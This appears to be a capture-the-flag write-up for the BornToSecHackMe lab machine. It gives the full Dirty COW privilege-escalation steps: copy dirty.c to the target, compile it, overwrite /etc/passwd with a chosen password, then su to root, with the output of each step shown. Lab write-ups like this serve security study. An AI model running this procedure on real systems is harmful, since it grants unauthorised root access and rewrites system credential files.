@@ -1,0 +1,30 @@
+BONUS 1 - Dirty cow
+
+https://dirtycow.ninja/ 
+
+Repeat 1-3 steps from writeup1.
+
+Copy dirty.c from repository to target (BootToSec):
+	
+	scp -P 4242 /Users/ophuong/dirty.c laurie@localhost:/home/laurie
+
+Compile it with GCC:
+
+	gcc -pthread dirty.c -o dirty -lcrypt
+
+Then run program:
+	
+	./dirty
+
+		Output:
+			/etc/passwd successfully backed up to /tmp/passwd.bak
+			Please enter the new password:
+
+	Set new password, for example 123456
+	Press Control+C for exit.
+
+Connect to user 'root':
+	su root
+		Password: 123456
+			Output:
+				root@BornToSecHackMe:/home/laurie#
